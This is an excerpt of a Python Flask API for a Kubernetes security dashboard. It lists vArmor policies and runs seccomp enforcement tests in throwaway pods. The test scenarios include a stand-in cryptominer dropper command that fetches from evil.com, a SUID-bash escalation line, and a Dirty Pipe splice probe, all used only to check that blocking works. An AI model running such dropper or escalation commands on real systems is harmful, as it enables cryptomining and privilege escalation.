...
# ══════════════════════════════════════════════════════════════════════════════
#  Policy Monitor — all VarmorPolicies across every namespace
# ══════════════════════════════════════════════════════════════════════════════

@api_bp.route("/policy-monitor", methods=["GET"])
@require_auth
def policy_monitor():
    """Return all namespace + cluster VarmorPolicies with live status."""
    all_policies = []
    try:
    ...
    for ns in namespaces:
        try:
            raw = custom_objects().list_namespaced_custom_object(
                group=VARMOR_GROUP, version=VARMOR_VERSION,
                namespace=ns, plural=VARMOR_PLURAL,
            )
            for item in raw.get("items", []):
                all_policies.append(_parse_policy_item(item, "namespace", ns))
        except ApiException:
            pass
    ...
    try:
        ...
        for item in raw.get("items", []):
            all_policies.append(_parse_policy_item(item, "cluster"))
    except ApiException:
        pass
    except Exception:
        pass
    ...
    ready = sum(1 for p in all_policies if p.get("status") == "Ready")
    return jsonify({"policies": all_policies, "total": len(all_policies), "ready": ready})


# ══════════════════════════════════════════════════════════════════════════════
#  Enforcement Test — live attack scenario tests via Kubernetes exec
# ══════════════════════════════════════════════════════════════════════════════

_ET_STATE: dict = {"status": "idle", "results": [], "message": "No tests run yet.",
                   "passed": 0, "total": 0, "started_at": None, "finished_at": None}
_ET_LOCK = threading.Lock()
_ET_NS = "varmor-enf-test"

_ET_SCRIPT_CHMOD_X = (
    "import os,sys\n"
    "open('/tmp/evil','w').write('x')\n"
    "os.chmod('/tmp/evil',0o644)\n"
    "try:\n"
    "  os.chmod('/tmp/evil',0o755)\n"
    "  print('ALLOWED')\n"
    "  sys.exit(0)\n"
    "except PermissionError:\n"
    "  print('BLOCKED')\n"
...
_ET_SCRIPT_CHMOD_SUID = (
    "import os,sys\n"
    "open('/tmp/rootsh','w').write('x')\n"
    "os.chmod('/tmp/rootsh',0o755)\n"
    "try:\n"
...
_ET_SCRIPT_SPLICE = (
    ...
    "ret=libc.syscall(275,fd,None,w,None,ctypes.c_size_t(4096),ctypes.c_uint(0))\n"
    "os.close(fd);os.close(r);os.close(w)\n"
    "print('ALLOWED' if ret>=0 else 'BLOCKED')\n"
    "sys.exit(0 if ret>=0 else 1)\n"
)


def _et_make_pod(name, seccomp_profile=None):
    sc = None
    if seccomp_profile:
        sc = _k8s_client.V1PodSecurityContext(
            seccomp_profile=_k8s_client.V1SeccompProfile(
                type="Localhost",
                localhost_profile=f"varmor/{seccomp_profile}",
            )
        )
    return _k8s_client.V1Pod(
        metadata=_k8s_client.V1ObjectMeta(name=name, namespace=_ET_NS),
        spec=_k8s_client.V1PodSpec(
            security_context=sc,
            containers=[_k8s_client.V1Container(
                name=name,
...
def _et_exec(pod_name, script):
    ...
    try:
        ...
        return f"EXEC_ERROR: {str(ex)[:80]}"


def _et_wait_running(pod_name, deadline):
    import time
    while time.time() < deadline:
        try:
            pod = core_v1().read_namespaced_pod(pod_name, _ET_NS)
...
def _run_enforcement_tests_bg():
    import time
    results = []

    def _upd(msg):
        with _ET_LOCK:
            _ET_STATE["message"] = msg

    try:
        _upd("Creating test namespace…")
        try:
            core_v1().create_namespace(body=_k8s_client.V1Namespace(
                metadata=_k8s_client.V1ObjectMeta(name=_ET_NS)
            ))
        ...
        pods_cfg = [
            ("et-base",        None),
            ("et-chmod-x",     "chmod-x.json"),
            ("et-chmod-suid",  "chmod-suid.json"),
            ("et-dirty-pipe",  "dirty-pipe.json"),
        ]

        _upd("Creating test pods…")
        for pname, sc in pods_cfg:
            try:
                core_v1().create_namespaced_pod(_ET_NS, _et_make_pod(pname, sc))
            except ApiException as e:
                if e.status != 409:
                    logger.warning("ET: pod create %s: %s", pname, e)

        _upd("Waiting for pods to start (up to 90s)…")
        deadline = time.time() + 90
        pod_ok = {pname: _et_wait_running(pname, deadline) for pname, _ in pods_cfg}

        def run_pair(label, scenario, script, base_pod, prot_pod):
            b = _et_exec(base_pod, script) if pod_ok.get(base_pod) else "POD_NOT_READY"
            p = _et_exec(prot_pod, script) if pod_ok.get(prot_pod) else "POD_NOT_READY"
            ok = "ALLOWED" in b and "BLOCKED" in p
            results.append({
                "name": label,
                "scenario": scenario,
                "enforcer": "Seccomp",
                ...
                "protected": p,
                "ok": ok,
                "skip": "POD_NOT_READY" in (b + p),
            })

        _upd("Test 1/3: chmod+x dropper…")
        run_pair(
            "chmod+x Dropper",
            "wget evil.com/miner && chmod +x miner && ./miner  (#1 K8s crypto miner vector)",
            _ET_SCRIPT_CHMOD_X, "et-base", "et-chmod-x",
        )

        _upd("Test 2/3: SUID privilege escalation…")
        run_pair(
            "SUID Privilege Escalation",
            "chmod 4755 /bin/bash  → run setuid shell inside container",
            _ET_SCRIPT_CHMOD_SUID, "et-base", "et-chmod-suid",
        )

        _upd("Test 3/3: CVE-2022-0847 Dirty Pipe (splice)…")
        run_pair(
            "CVE-2022-0847 Dirty Pipe",
            "splice() syscall used to overwrite read-only mapped files  → LPE",
            _ET_SCRIPT_SPLICE, "et-base", "et-dirty-pipe",
        )

        _upd("Cleaning up…")
        for pname, _ in pods_cfg:
            try:
        ...
        try:
            core_v1().delete_namespace(
                _ET_NS, body=_k8s_client.V1DeleteOptions(grace_period_seconds=0)
            )
        except Exception:
            pass
        ...
        with _ET_LOCK:
            _ET_STATE.update({
                ...
                "skipped": skipped,
                "total": len(results),
                "message": f"{passed}/{len(results)} passed" + (f", {skipped} skipped" if skipped else ""),
                "finished_at": datetime.datetime.utcnow().isoformat() + "Z",
            })

    except Exception as exc:
        logger.exception("Enforcement test background thread failed")
        with _ET_LOCK:
            _ET_STATE.update({
                "status": "error",
                "results": results,
...
@api_bp.route("/enforcement-test/run", methods=["POST"])
@require_admin
def start_enforcement_test():
    with _ET_LOCK:
        if _ET_STATE.get("status") == "running":
            return jsonify({"error": "Test already running"}), 409
        _ET_STATE.update({
            "status": "running", "results": [], "passed": 0, "total": 0, "skipped": 0,
            "message": "Starting…",
            "started_at": datetime.datetime.utcnow().isoformat() + "Z",
            "finished_at": None,
        })
    threading.Thread(target=_run_enforcement_tests_bg, daemon=True).start()
    return jsonify({"status": "started"})


@api_bp.route("/enforcement-test/status", methods=["GET"])
@require_auth
def get_enforcement_test_status():
    with _ET_LOCK:
        return jsonify(dict(_ET_STATE))
